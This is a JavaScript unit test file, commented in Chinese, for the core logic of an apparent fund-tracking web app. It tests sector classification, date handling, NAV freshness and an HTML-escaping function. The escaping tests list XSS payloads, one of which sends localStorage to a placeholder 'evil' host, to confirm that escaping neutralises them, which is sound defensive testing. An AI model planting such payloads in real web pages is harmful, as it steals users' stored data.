/* Sprint 0 单测：js/core.js 纯逻辑层。运行：npm test 或 node --test tests/ */
import test from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";

const require = createRequire(import.meta.url);
const { INDUSTRY_RULES, bucketOf, fundMainBucket, esc, todayLocal, isFreshNav } =
  require("../js/core.js");

/* ---------- 板块分类 ---------- */
test("INDUSTRY_RULES 覆盖 10 个板块关键词规则", () => {
  assert.ok(INDUSTRY_RULES.length >= 10);
  const buckets = new Set(INDUSTRY_RULES.map(([, b]) => b));
  for (const b of ["信息技术","先进制造","消费","医药","金融","周期资源","基建地产","黄金","海外QDII","未披露"])
    assert.ok(buckets.has(b), `缺少规则板块: ${b}`);
});

test("bucketOf：各板块代表细分行业归桶", () => {
  const cases = {
    "贵金属": "黄金", "半导体": "信息技术", "通信设备": "信息技术",
    "消费电子": "信息技术", "电池": "先进制造", "光伏设备": "先进制造",
    "中药Ⅱ": "医药", "医疗服务": "医药", "国有大型银行Ⅱ": "金融",
    "证券Ⅱ": "金融", "白酒Ⅱ": "消费", "畜牧养殖": "消费",
    "钢铁": "周期资源", "工业金属": "周期资源", "房地产开发": "基建地产",
    "航运港口": "基建地产", "纳斯达克综合指数": "海外QDII", "港股通": "海外QDII",
  };
  for (const [ind, want] of Object.entries(cases))
    assert.equal(bucketOf(ind), want, `${ind} 应归 ${want}`);
});

test("bucketOf：未披露/其他 单列，不再混入综合", () => {
  assert.equal(bucketOf("未披露/其他"), "未披露");
});

test("bucketOf：未知行业兜底为综合", () => {
  assert.equal(bucketOf("神秘的行业"), "综合");
});

/* ---------- 主板块 ---------- */
test("fundMainBucket：020691 真实数据 → 信息技术/通信设备（未披露不夺主板块）", () => {
  const r = fundMainBucket({"通信设备": 56.07, "消费电子": 12.21, "未披露/其他": 31.72}, "综合");
  assert.equal(r.bucket, "信息技术");
  assert.equal(r.sub, "通信设备");
});

test("fundMainBucket：无行业数据走兜底板块", () => {
  const r = fundMainBucket({}, "黄金");
  assert.deepEqual(r, {bucket: "黄金", sub: ""});
});

test("fundMainBucket：null/undefined 行业数据走兜底板块", () => {
  assert.deepEqual(fundMainBucket(null, "海外QDII"), {bucket: "海外QDII", sub: ""});
});

test("fundMainBucket：未披露占主时主板块诚实地显示未披露", () => {
  const r = fundMainBucket({"未披露/其他": 80, "银行": 5}, "综合");
  assert.equal(r.bucket, "未披露");
});

/* ---------- esc 转义（XSS 防线） ---------- */
test("esc：脚本标签与事件处理器向量全部中性化", () => {
  for (const v of [
    `<img src=x onerror=alert(1)>`,
    `<script>alert(1)<\/script>`,
    `"><img src=x onerror=fetch('//evil?t='+localStorage)>`,
    `<svg/onload=alert(1)>`,
    `';alert(1);//`,
  ]) {
    const out = esc(v);
    assert.ok(!/[<>]/.test(out), `输出不应含 <>: ${out}`);
    assert.ok(!/onerror|onload/i.test(out) || out.includes("&lt;") || out.includes("&quot;"),
      `事件属性应被转义: ${out}`);
  }
});

test("esc：引号转义，属性上下文无法逃逸", () => {
  assert.equal(esc(`" onfocus=alert(1) autofocus="`), "&quot; onfocus=alert(1) autofocus=&quot;");
  assert.equal(esc(`'`), "&#39;");
});

test("esc：正常文本不变，空值安全", () => {
  assert.equal(esc("博时中证全指通信设备指数A"), "博时中证全指通信设备指数A");
  assert.equal(esc(""), "");
  assert.equal(esc(null), "");
  assert.equal(esc(undefined), "");
  assert.equal(esc(123.45), "123.45");
});

test("esc：& 优先转义不产生二次编码", () => {
  assert.equal(esc(`&lt;img&gt;`), "&amp;lt;img&amp;gt;");
});

/* ---------- 本地日期 ---------- */
test("todayLocal：取本地时区字段而非 UTC", () => {
  // 本地 2026-09-07 23:59 → 当天；若误用 toISOString 在东八区会跳到 09-07 的 UTC 或跨日
  assert.equal(todayLocal(new Date(2026, 8, 7, 23, 59, 59)), "2026-09-07");
  assert.equal(todayLocal(new Date(2026, 0, 1, 0, 0, 0)), "2026-01-01");
  // 逐月校验补零
  for (let m = 0; m < 12; m++)
    assert.equal(todayLocal(new Date(2026, m, 5)), `2026-${String(m+1).padStart(2,"0")}-05`);
});

/* ---------- 净值时效 ---------- */
test("isFreshNav：4 个自然日窗口内新鲜", () => {
  const now = new Date(2026, 8, 7, 12, 0, 0);   // 2026-09-07
  assert.equal(isFreshNav("2026-09-07", now), true);
  assert.equal(isFreshNav("2026-09-05", now), true);   // 周五净值，周一查看
  assert.equal(isFreshNav("2026-09-03", now), true);   // 恰好 4 天
  assert.equal(isFreshNav("2026-09-02", now), false);  // 5 天 → 过期
  assert.equal(isFreshNav("2026-08-29", now), false);
});

test("isFreshNav：允许未来 1 天（对端时区偏差），拒绝更远未来", () => {
  const now = new Date(2026, 8, 7, 12, 0, 0);
  assert.equal(isFreshNav("2026-09-08", now), true);
  assert.equal(isFreshNav("2026-09-09", now), false);
});

test("isFreshNav：垃圾输入返回 false", () => {
  assert.equal(isFreshNav("", new Date()), false);
  assert.equal(isFreshNav(null, new Date()), false);
  assert.equal(isFreshNav("not-a-date", new Date()), false);
});
